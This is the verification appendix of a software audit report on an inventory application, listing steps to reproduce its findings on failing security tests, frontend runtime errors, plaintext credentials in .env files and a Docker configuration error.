To independently verify the observations, failure logs, and architectural findings cataloged in this report:

1. **Verify Route Security & RBAC Deficits**:
   - Execute the test suite from `backend/`: `node test_m2_security.js`
   - Observe the 24 failing assertions matching Section 5.2.
2. **Verify Frontend Runtime Defects**:
   - Open `dashboard/index.html` in a web browser.
   - Navigate to Zones $\rightarrow$ Click "Manage Zones" $\rightarrow$ Click "Add" $\rightarrow$ Observe `Uncaught ReferenceError: showToast is not defined`.
   - Open Kit Details $\rightarrow$ Add Item $\rightarrow$ Observe `alert(undefined)` dialog.
   - Select 2 items $\rightarrow$ Click "Export QR Labels" $\rightarrow$ Observe `"undefined"` serial numbers.
3. **Verify Secrets Exposure**:
   - Inspect `.env`, `backend/.env`, `.env.example`, and `Inventario Entelso (2).json` to confirm plaintext credentials.
4. **Verify Docker Deployment Blockers**:
   - Run `docker compose config` in project root $\rightarrow$ Observe failure locating `./backend/.env.production`.

---
*Report compiled and certified by the Master Audit Assembler on 2026-08-14.*
